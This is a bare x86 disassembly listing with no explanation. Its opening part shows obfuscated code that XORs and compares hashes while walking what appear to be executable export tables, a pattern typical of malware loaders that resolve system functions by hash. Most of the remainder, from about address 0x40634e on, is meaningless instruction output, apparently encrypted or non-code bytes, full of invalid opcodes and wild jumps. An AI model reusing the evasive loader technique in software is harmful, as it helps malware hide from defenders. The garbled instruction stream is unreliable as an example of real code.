  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x4239d2
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	inc    esp
  40635b:	ret    0x36f9
  40635e:	cmp    BYTE PTR [ebx],bh
  406360:	bound  esp,QWORD PTR [edx+0x10]
  406363:	pop    edi
  406364:	bound  esp,QWORD PTR [edx+0x47]
  406367:	(bad)  
  406368:	mov    ebp,0xbc044e50
  40636d:	popf   
  40636e:	xor    al,0x9
  406370:	ss jge 0x4063ac
  406373:	fmul   st,st(1)
  406375:	jg     0x406340
  406377:	mov    edi,0x32747d06
  40637c:	sbb    eax,0x730dd477
  406381:	cwde   
  406382:	xor    eax,DWORD PTR [ebx+0x40256403]
  406388:	jl     0x4063cc
  40638a:	push   ebp
  40638b:	lods   al,BYTE PTR ds:[esi]
  40638c:	aas    
  40638d:	fisttp WORD PTR [ebp+0x5e2e3a2d]
  406393:	sub    DWORD PTR [edi],ecx
  406395:	and    DWORD PTR [eax-0x7af23250],eax
  40639b:	rcl    esi,0x3b
  40639e:	out    0x47,eax
  4063a0:	fwait
  4063a1:	cmp    DWORD PTR [eax+0x61],edi
  4063a4:	mov    esi,0x707ea841
  4063a9:	(bad)  
  4063aa:	iret   
  4063ab:	adc    ch,bl
  4063ad:	iret   
  4063ae:	shl    DWORD PTR [eax+0x49],1
  4063b1:	mov    ebx,0x3ed79e39
  4063b6:	mov    esi,0x65e7d410
  4063bb:	add    ah,BYTE PTR [edi+eax*1]
  4063be:	push   0x8eacce7e
  4063c3:	xor    DWORD PTR [edx+eax*4],esi
  4063c6:	xor    eax,0x2cd1ac10
  4063cb:	pop    ds
  4063cc:	mov    edi,0xef51ab8f
  4063d1:	adc    eax,0xb928dcb7
  4063d6:	ror    DWORD PTR [edi-0x1c],1
  4063d9:	xchg   edx,esi
  4063db:	lea    ecx,[esi+esi*8-0x75]
  4063df:	jmp    0x68a769ab
  4063e4:	hlt    
  4063e5:	sub    BYTE PTR [ebx+edx*1],0xa8
  4063e9:	xchg   DWORD PTR [ecx+0x27a383f5],edx
  4063ef:	popf   
  4063f0:	jmp    0x40643f
  4063f2:	jo     0x40641d
  4063f4:	frstor [ebx]
  4063f6:	fwait
  4063f7:	push   0x2a23aaf6
  4063fc:	call   0xb378:0x42ea95c8
  406403:	sub    esp,DWORD PTR [eax+0x5c89a379]
  406409:	adc    DWORD PTR [ebp-0x793b1417],ebx
  40640f:	imul   ebp,ebx,0xf4efd9a4
  406415:	cld    
  406416:	pop    es
  406417:	arpl   WORD PTR [esi-0x5f8b775b],cx
  40641d:	sti    
  40641e:	cmp    eax,0xc0b7f3fe
  406423:	fmul   QWORD PTR [ebx-0x3c]
  406426:	pop    es
  406427:	push   es
  406428:	sbb    ah,dh
  40642a:	or     al,0x82
  40642c:	or     dh,BYTE PTR [edi-0x222a28bf]
  406432:	pop    eax
  406433:	or     eax,0x26aa124
  406438:	mov    cl,0xf1
  40643b:	pop    es
  40643c:	popa   
  40643d:	dec    ecx
  40643e:	fsubrp st(1),st
  406440:	ss stc 
  406442:	loope  0x4064b2
  406444:	inc    ebp
  406445:	into   
  406446:	clc    
  406447:	mov    edx,0xbd1561aa
  40644c:	dec    ecx
  40644d:	fs pop edx
  40644f:	dec    esi
  406450:	and    edx,edi
  406452:	mov    eax,cs:0xdfbae35a
  406458:	or     edi,DWORD PTR [ebx-0x53]
  40645b:	in     eax,dx
  40645c:	and    edi,DWORD PTR [edi]
  40645e:	dec    edi
  40645f:	push   esp
  406460:	xor    eax,0xeb8bc265
  406465:	cmp    eax,0x9f547eed
  40646a:	fcmovnu st,st(0)
  40646c:	lods   eax,DWORD PTR es:[esi]
  40646e:	push   esi
  40646f:	push   0x7e
  406471:	pop    esi
  406472:	mov    cl,0x5
  406474:	bound  eax,QWORD PTR [edi]
  406476:	lods   eax,DWORD PTR ds:[esi]
  406477:	dec    DWORD PTR [ebx+0x4d]
  40647a:	push   eax
  40647b:	mov    ecx,0xaa2cab65
  406480:	and    eax,DWORD PTR [esi-0x58]
  406483:	jae    0x4064cf
  406485:	rcr    DWORD PTR [edx],0xf
  406488:	out    dx,eax
  406489:	inc    ecx
  40648a:	jne    0x4064b2
  40648c:	test   eax,0xe69ab874
  406491:	jns    0x406429
  406493:	inc    ebx
  406494:	and    ah,BYTE PTR [ecx-0x7f]
  406497:	push   esp
  406498:	imul   esi,DWORD PTR [edx+0x6e061e9d],0x3f4b4445
  4064a2:	mov    ebx,0x5d276cf8
  4064a7:	pusha  
  4064a8:	retf   0xfccf
  4064ab:	dec    ecx
  4064ac:	dec    esp
  4064ad:	and    esi,DWORD PTR [ecx+0x3f]
  4064b0:	lea    ecx,[ebx-0x266ea680]
  4064b6:	jmp    0xf75379f0
  4064bb:	mov    eax,ds:0x9e92f8c0
  4064c0:	mov    eax,ds:0x32496b78
  4064c5:	xchg   DWORD PTR [edi+0x69343b26],ebp
  4064cb:	call   0xc117a04d
  4064d0:	mov    esi,0x39c8cefd
  4064d5:	dec    esp
  4064d6:	pop    eax
  4064d7:	stc    
  4064d8:	imul   eax,DWORD PTR [edi+0x62],0xffffffae
  4064dc:	dec    ebp
  4064dd:	into   
  4064de:	xchg   ebp,eax
  4064df:	pop    ecx
  4064e0:	adc    eax,0xd399b525
  4064e5:	jns    0x4064d6
  4064e7:	push   edx
  4064e8:	scas   eax,DWORD PTR es:[edi]
  4064e9:	sbb    ebp,esi
  4064eb:	mov    bh,0xbf
  4064ed:	dec    esi
  4064ee:	retf   
  4064ef:	jo     0x4064eb
  4064f1:	(bad)  
  4064f2:	jp     0x40647a
  4064f4:	xor    eax,0x27636917
  4064f9:	sbb    esp,0xc50e246e
  4064ff:	nop
  406500:	jp     0x4064e5
  406502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406503:	and    edx,DWORD PTR [edi]
  406505:	mov    cl,0xa2
  406507:	int    0x77
  406509:	jns    0x4064ff
  40650b:	clc    
  40650c:	pusha  
  40650d:	(bad)  
  40650e:	std    
  40650f:	mov    cl,0x96
  406511:	lock sub eax,0x939db67d
  406517:	dec    ebx
  406518:	xchg   esi,eax
  406519:	pop    ebx
  40651a:	sbb    esi,0x93af7a67
  406520:	or     BYTE PTR [edx],al
  406522:	jae    0x40655f
  406524:	dec    esp
  406525:	add    al,0x7f
  406527:	or     BYTE PTR [edi+0x13e6a2c3],bl
  40652d:	into   
  40652e:	scas   al,BYTE PTR es:[edi]
  40652f:	aad    0xcd
  406531:	push   ss
  406532:	call   0xca6b:0xb77e8c3c
  406539:	aam    0x6
  40653b:	and    ch,BYTE PTR [edi+0x7c]
  40653e:	repz arpl WORD PTR [bx],cx
  406542:	adc    dl,BYTE PTR [edx+0xed25b98]
  406548:	shr    bh,1
  40654a:	shl    edx,0x47
  40654d:	loop   0x406566
  40654f:	frstor [edx]
  406551:	in     eax,dx
  406552:	mov    DWORD PTR [edx],edi
  406554:	inc    edx
  406555:	test   DWORD PTR [ebx],ebx
  406557:	ret    0x4ad5
  40655a:	or     edi,DWORD PTR [eax-0xa]
  40655d:	mov    ds:0xb5610830,eax
  406562:	cdq    
  406563:	aaa    
  406564:	jl     0x40650d
  406566:	pop    ds
  406567:	add    eax,0x79c9eae7
  40656c:	push   ss
  40656d:	pop    esp
  40656e:	scas   eax,DWORD PTR es:[edi]
  40656f:	adc    eax,0xe8fac6ef
  406574:	jbe    0x4065a5
  406576:	dec    edx
  406577:	pop    ds
  406578:	scas   al,BYTE PTR es:[edi]
  406579:	inc    ebx
  40657a:	jnp    0x406508
  40657c:	push   0xffffffb1
  40657e:	in     eax,dx
  40657f:	out    0x9d,eax
  406581:	mov    bh,0x6a
  406583:	leave  
  406584:	fdiv   st(5),st
  406586:	and    DWORD PTR [edx+esi*4],ecx
  406589:	sub    BYTE PTR [ebp+0x16],al
  40658c:	pop    ecx
  40658d:	(bad)  
  40658f:	les    ebp,FWORD PTR [eax-0x39c0fa33]
  406595:	mov    edx,0xdde1ed3c
  40659a:	jb     0x4065d8
  40659c:	stos   BYTE PTR es:[edi],al
  40659d:	sti    
  40659e:	pop    es
  40659f:	(bad)  
  4065a0:	xchg   edx,eax
  4065a1:	mov    dl,0x45
  4065a3:	mov    eax,0x94ceb387
  4065a8:	test   eax,0x478dc7ab
  4065ad:	mov    DWORD PTR [edi],edx
  4065af:	pusha  
  4065b0:	hlt    
  4065b1:	inc    ebx
  4065b2:	pop    esi
  4065b3:	repnz and esi,esp
  4065b6:	(bad)  
  4065b7:	aad    0x81
  4065b9:	adc    bh,cl
  4065bb:	xor    eax,0x95e37c26
  4065c0:	dec    ecx
  4065c1:	mov    DWORD PTR [esi-0x32],0xc9755e4
  4065c8:	lock fbld TBYTE PTR [ecx+0x30a1c90]
  4065cf:	cmp    BYTE PTR [edi],al
  4065d1:	push   ds
  4065d2:	xor    BYTE PTR [ecx-0x15df50ab],0x5
  4065d9:	mov    esi,0x251d8135
  4065de:	clc    
  4065df:	imul   ebx,ebx,0x3b
  4065e2:	mov    DWORD PTR ds:0x2bebd7b6,ebp
  4065e8:	sbb    bh,dh
  4065ea:	inc    ebp
  4065eb:	bound  edx,QWORD PTR [eax]
  4065ed:	pop    ebx
  4065ee:	pop    ebp
  4065ef:	inc    edx
  4065f0:	into   
  4065f1:	mov    DWORD PTR [ecx+0x1c],ecx
  4065f4:	sbb    BYTE PTR [ebx+ecx*2+0x846846e],ch
  4065fb:	push   eax
  4065fc:	test   esi,ecx
  4065fe:	out    dx,al
  4065ff:	in     al,0x18
  406601:	loopne 0x4065b4
  406603:	xchg   edi,eax
  406604:	(bad)  
  406605:	clc    
  406606:	cdq    
  406607:	inc    ecx
  406608:	out    dx,eax
  406609:	(bad)  
  40660a:	jl     0x406594
  40660c:	cld    
  40660d:	xor    eax,0x8a410181
  406612:	mov    ebx,edx
  406614:	xchg   ah,cl
  406616:	out    dx,eax
  406617:	pusha  
  406618:	lods   al,BYTE PTR ds:[esi]
  406619:	out    dx,eax
  40661a:	ret    
  40661b:	mov    bl,0x19
  40661d:	push   ss
  40661e:	push   ebp
  40661f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406620:	aad    0x2f
  406622:	mov    ?,WORD PTR [ebx]
  406624:	pop    eax
  406625:	inc    esp
  406626:	cmp    DWORD PTR [ecx+ebx*8+0x2fbf6b49],ebx
  40662d:	xchg   BYTE PTR [eax-0x670b3020],ah
  406633:	jl     0x406641
  406635:	out    0xa9,eax
  406637:	gs sti 
  406639:	push   edi
  40663a:	out    dx,al
  40663b:	lods   al,BYTE PTR ds:[esi]
  40663c:	inc    ebx
  40663d:	xchg   edi,eax
  40663e:	lods   eax,DWORD PTR ds:[esi]
  40663f:	push   ds
  406640:	ins    DWORD PTR es:[edi],dx
  406641:	loop   0x40664d
  406643:	add    BYTE PTR [edx+ecx*1-0x2d061686],0xc6
  40664b:	pop    esi
  40664c:	out    0x42,eax
  40664e:	lea    ebp,[ebx-0x23eff394]
  406654:	or     esi,DWORD PTR [edi-0x5ff0b553]
  40665a:	repz pop ecx
  40665c:	out    0xc2,eax
  40665e:	mov    al,ds:0xc89ac848
  406663:	ja     0x406695
  406665:	add    DWORD PTR [ebx],edi
  406667:	add    DWORD PTR [ebx+0x12],0x50
  40666b:	mov    ds:0xcc26f2f6,al
  406670:	hlt    
  406671:	ror    DWORD PTR [edi-0x349f4dd2],0xc7
  406678:	cwde   
  406679:	cli    
  40667a:	jge    0x40663b
  40667c:	add    al,0x3f
  40667e:	neg    BYTE PTR [edi+0x5f4cd53b]
  406684:	xor    bl,0xc
  406687:	dec    ebx
  406688:	mov    ecx,0xba46d706
  40668d:	mov    cl,0x34
  40668f:	data16 jnp 0x406628
  406692:	repnz mov ch,0x5a
  406695:	xor    al,0xbd
  406697:	jge    0x4066a9
  406699:	dec    edx
  40669a:	cmp    esp,DWORD PTR [ebx+0x54]
  40669d:	mov    ebx,0xdd700e66
  4066a2:	lds    esp,FWORD PTR [eax-0x54]
  4066a5:	in     eax,0x12
  4066a7:	mov    dh,BYTE PTR [ebp-0x3d]
  4066aa:	xchg   edi,eax
  4066ab:	xchg   ebx,eax
  4066ac:	add    eax,0x2547c465
  4066b1:	xor    edi,edi
  4066b3:	or     BYTE PTR [ebx],cl
  4066b5:	aad    0x17
  4066b7:	cmp    BYTE PTR [edx+edx*4+0x6071d455],bl
  4066be:	fisttp QWORD PTR [edx-0x7877604e]
  4066c4:	inc    esp
  4066c5:	push   0x922b3361
  4066ca:	lock push edi
  4066cc:	into   
  4066cd:	pop    ds
  4066ce:	xchg   ch,bl
  4066d0:	xchg   ebx,eax
  4066d1:	sti    
  4066d2:	jo     0x40674a
  4066d4:	out    0xa3,al
  4066d6:	dec    ebx
  4066d7:	adc    BYTE PTR [ecx+eiz*4-0x67],ch
  4066db:	jns    0x406668
  4066dd:	leave  
  4066de:	lds    esp,FWORD PTR ds:0xcdcd60fc
  4066e4:	fld    TBYTE PTR [ebx-0x5c]
  4066e7:	out    0xbd,eax
  4066e9:	mov    es,esi
  4066eb:	dec    eax
  4066ec:	nop
  4066ed:	arpl   WORD PTR [edi+esi*1-0x15],bp
  4066f1:	add    al,0xfc
  4066f3:	inc    edx
  4066f4:	sbb    esp,esp
  4066f6:	cmp    ebp,ebx
  4066f8:	imul   edx,ecx,0xffffffda
  4066fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066fc:	or     DWORD PTR [eax],0x5977f093
  406702:	out    0x90,al
  406704:	shr    DWORD PTR [ebx],1
  406706:	or     DWORD PTR [edi-0x2aa5f948],esp
  40670c:	xchg   ecx,eax
  40670d:	fwait
  40670e:	adc    bh,ch
  406710:	and    eax,0xeaf3f540
  406715:	test   DWORD PTR [eax],edx
  406717:	out    0x24,al
  406719:	dec    edi
  40671a:	mov    ebx,0x2064a4a6
  40671f:	stc    
  406720:	fdivp  st(1),st
  406722:	push   ebx
  406723:	mov    esp,0x955abe39
  406728:	xchg   esi,eax
  406729:	shl    DWORD PTR [edx+0x3c057a6d],1
  40672f:	jg     0x40678c
  406731:	sub    dl,BYTE PTR [ebp+0xb]
  406734:	inc    eax
  406735:	sub    eax,0xcd55b48a
  40673a:	mov    ah,0x69
  40673c:	ret    0xca90
  40673f:	push   esp
  406740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406741:	mov    ebx,DWORD PTR [edx]
  406743:	xor    esp,DWORD PTR [edi+eax*8]
  406746:	stos   BYTE PTR es:[edi],al
  406747:	sbb    edi,DWORD PTR [edi]
  406749:	and    eax,0xc11195e6
  40674e:	cmp    BYTE PTR [esi-0x3e5cd880],dh
  406754:	jbe    0x406793
  406756:	enter  0x6399,0x2
  40675a:	xchg   ebx,eax
  40675b:	inc    edi
  40675c:	xor    DWORD PTR [ebx-0x7b],edi
  40675f:	xchg   ebx,eax
  406760:	mov    eax,ds:0x7b2909c4
  406765:	dec    ebx
  406766:	push   ebp
  406767:	ror    esp,0xd8
  40676a:	push   esp
  40676b:	xchg   esi,eax
  40676c:	jmp    0x406756
  40676e:	mov    ds:0xc6efa5e2,eax
  406773:	and    eax,0x511d8054
  406778:	fwait
  406779:	and    esi,DWORD PTR [ebx+esi*8]
  40677c:	adc    ch,ch
  40677e:	(bad)  
  40677f:	jmp    0xc9f4e841
  406784:	jmp    0x406755
  406786:	fcom   QWORD PTR [edi+0x7d]
  406789:	sbb    al,0xc1
  40678b:	push   es
  40678c:	adc    eax,0xe33984db
  406791:	xchg   edx,eax
  406792:	popa   
  406793:	and    dl,BYTE PTR [eax+esi*2]
  406796:	mov    ds:0x109bfa34,eax
  40679b:	mov    al,ds:0xa85147ca
  4067a0:	mov    edx,0x277ce907
  4067a5:	scas   eax,DWORD PTR es:[edi]
  4067a6:	pop    eax
  4067a7:	outs   dx,DWORD PTR ds:[esi]
  4067a8:	push   eax
  4067a9:	imul   ecx,DWORD PTR [ecx+0x18],0x673bc6b2
  4067b0:	push   0x68
  4067b2:	dec    ecx
  4067b3:	mov    WORD PTR gs:[ecx],ds
  4067b6:	(bad)  
  4067b7:	mov    esi,0x45490d2c
  4067bc:	mov    ds:0x741c618b,eax
  4067c1:	in     al,0x73
  4067c3:	push   ebp
  4067c4:	and    ebp,DWORD PTR [ecx]
  4067c6:	sub    ch,BYTE PTR [eax]
  4067c8:	out    dx,al
  4067c9:	jne    0x40675a
  4067cb:	lahf   
  4067cc:	lock mov ah,0x1
  4067cf:	or     BYTE PTR fs:0x1e2c2187,dl
  4067d6:	mov    DWORD PTR [eax-0x338437f6],esp
  4067dc:	and    BYTE PTR [edx],cl
  4067de:	shl    BYTE PTR [ebx-0x67],0xb2
  4067e2:	fwait
  4067e3:	jb     0x40679d
  4067e5:	jo     0x406800
  4067e7:	je     0x4067cb
  4067e9:	mov    al,0x83
  4067eb:	jmp    0x3ef2:0xa2c10a8
  4067f2:	push   eax
  4067f3:	xor    DWORD PTR [eax],0x39
  4067f6:	cmp    dh,al
  4067f8:	lods   al,BYTE PTR ds:[esi]
  4067f9:	call   0x26668a40
  4067fe:	ret    
  4067ff:	xor    DWORD PTR [edx-0x1859e29b],eax
  406805:	call   0xd7b6:0xbfb887d2
  40680c:	jno    0x406858
  40680e:	loopne 0x40680e
  406810:	jle    0x4067f0
  406812:	idiv   BYTE PTR [eax-0x61f7dc88]
  406818:	pop    eax
  406819:	iret   
  40681a:	cmp    DWORD PTR [ecx-0x49],ebp
  40681d:	outs   dx,DWORD PTR ds:[esi]
  40681e:	addr16 cld 
  406820:	or     eax,0x4fd08978
  406825:	push   es
  406826:	adc    ebp,DWORD PTR [eax-0x4546e57d]
  40682c:	popf   
  40682d:	shl    DWORD PTR [ebp+0x2b578df2],1
  406833:	cmp    dh,ah
  406835:	xchg   ebp,eax
  406836:	sub    esi,ebx
  406838:	mov    ebp,0xfe16c733
  40683d:	das    
  40683e:	mov    bl,0xb2
  406840:	mov    dl,0x4c
  406842:	xor    eax,DWORD PTR [esi+0x73]
  406845:	sbb    bl,BYTE PTR [edi-0x4d]
  406848:	aad    0xa4
  40684a:	imul   ebx,DWORD PTR [eax],0x447ea031
  406850:	push   edx
  406851:	push   edi
  406852:	mov    ecx,0x9ab66846
  406857:	ficom  WORD PTR [ebx-0x62]
  40685a:	pop    edx
  40685b:	or     al,0xc8
  40685d:	jno    0x4067e5
  40685f:	clc    
  406860:	fisubr WORD PTR [edi-0x2a0eb468]
  406866:	lds    eax,FWORD PTR [ebx+0x21b67d2a]
  40686c:	adc    bh,BYTE PTR [edx+0x6c]
  40686f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406870:	lds    esi,FWORD PTR [eax]
  406872:	leave  
  406873:	sahf   
  406874:	dec    ecx
  406875:	(bad)  
  406876:	xchg   ebx,eax
  406877:	inc    ebx
  406878:	es jnp 0x406800
  40687b:	test   ch,ah
  40687d:	outs   dx,DWORD PTR ds:[esi]
  40687e:	and    ah,BYTE PTR [esi]
  406880:	xchg   ebp,eax
  406881:	push   0x71
  406883:	pop    esp
  406884:	jp     0x40686d
  406886:	pusha  
  406887:	jmp    0x40680c
  406889:	sub    DWORD PTR [edi+0x235bc0f2],edx
  40688f:	jmp    0x406840
  406891:	in     al,0xee
  406893:	add    al,0x32
  406895:	adc    esi,DWORD PTR [esi-0x1e]
  406898:	cdq    
  406899:	pop    esp
  40689a:	cmp    ah,dl
  40689c:	shl    BYTE PTR [esi+0x401abc2a],1
  4068a2:	mov    ah,0x22
  4068a4:	gs jno 0x406888
  4068a7:	add    eax,0x9494f679
  4068ac:	add    esp,DWORD PTR [edx]
  4068ae:	adc    al,0x88
  4068b0:	loopne 0x406846
  4068b2:	pop    ebp
  4068b3:	shl    bl,1
  4068b5:	push   esp
  4068b6:	int3   
  4068b7:	mov    esp,0xc0c97727
  4068bc:	loopne 0x4068c7
  4068be:	add    edx,esp
  4068c0:	push   es
  4068c1:	push   ds
  4068c2:	popa   
  4068c3:	sar    BYTE PTR [ebx],cl
  4068c5:	sub    al,0xd8
  4068c7:	pop    esp
  4068c8:	(bad)  
  4068c9:	pop    ecx
  4068ca:	loop   0x406928
  4068cc:	and    ebp,esp
  4068ce:	or     BYTE PTR [ebp+0x621d927],al
  4068d4:	(bad)  
  4068d5:	mov    ebx,0x72dc0b0b
  4068da:	popf   
  4068db:	mov    es,WORD PTR [esi-0x2ab95952]
  4068e1:	ficomp DWORD PTR [edi-0x54b05583]
  4068e7:	dec    edi
  4068e8:	mov    esp,esi
  4068ea:	lds    ecx,FWORD PTR [eax-0x14]
  4068ed:	lods   eax,DWORD PTR ds:[esi]
  4068ee:	jbe    0x406902
  4068f0:	mov    fs,WORD PTR [ebx+0x4]
  4068f3:	out    0x5c,al
  4068f5:	test   eax,0xe1a6a3b1
  4068fa:	loop   0x406924
  4068fc:	dec    edi
  4068fd:	adc    dl,dl
  4068ff:	call   0x9dd0:0xc763ae65
  406906:	mov    al,0x6d
  406908:	xor    ch,BYTE PTR [esi+ebx*2-0x274b0076]
  40690f:	mov    dh,0xf0
  406911:	inc    ebx
  406912:	repnz cmp eax,edx
  406915:	mov    ebx,0x90f449a6
  40691a:	cld    
  40691b:	and    al,0xfc
  40691d:	ret    0x88ad
  406920:	pop    edi
  406921:	lahf   
  406922:	adc    bl,bl
  406924:	jo     0x406922
  406926:	aaa    
  406927:	into   
  406928:	mov    edi,0x67a88749
  40692d:	mov    ebp,ds
  40692f:	inc    ebx
  406930:	rol    DWORD PTR [edi],0xb5
  406933:	pop    ebx
  406934:	arpl   WORD PTR [edx-0x4a4304d3],cx
  40693a:	ficom  WORD PTR [ebx+0x48]
  40693d:	pop    edi
  40693e:	std    
  40693f:	adc    BYTE PTR [edi],ch
  406941:	(bad)  
  406942:	stc    
  406943:	mov    eax,ds:0xa2093c66
  406948:	push   0xffffffbf
  40694a:	aas    
  40694b:	das    
  40694c:	ins    DWORD PTR es:[edi],dx
  40694d:	jmp    0xdc51:0xb3e640de
  406954:	in     al,0x30
  406956:	mov    bh,0xfd
  406958:	xor    esi,ebp
  40695a:	add    BYTE PTR [ebp-0x434623e6],0x80
  406961:	cs push esp
  406963:	jmp    0x57589422
  406968:	push   eax
  406969:	dec    ecx
  40696a:	or     BYTE PTR [ebx-0x63],ah
  40696d:	jnp    0x40690c
  40696f:	retf   0x52c2
  406972:	stc    
  406973:	dec    eax
  406974:	jg     0x4069ba
  406976:	lock jnp 0x40694e
  406979:	or     al,0x18
  40697b:	icebp  
  40697c:	jne    0x406900
  40697e:	pop    edx
  40697f:	lgs    edx,FWORD PTR [esp+ecx*8+0x6a]
  406984:	mov    ds,esi
  406986:	inc    ebx
  406987:	jmp    0x8fa0881e
  40698c:	add    eax,0x942d4045
  406991:	lea    esp,[ebx-0x70]
  406994:	mov    eax,eax
  406996:	gs and al,0x6
  406999:	imul   eax,ebp,0x63
  40699c:	jg     0x4069eb
  40699e:	push   es
  40699f:	shr    dh,cl
  4069a1:	or     dh,BYTE PTR [edx+eax*2]
  4069a4:	inc    esi
  4069a5:	jp     0x4069e0
  4069a7:	sbb    al,0xd5
  4069a9:	cmp    eax,0x63146ecb
  4069ae:	les    edx,FWORD PTR [edx+0x1cf1504c]
  4069b4:	adc    al,0x18
  4069b6:	out    dx,al
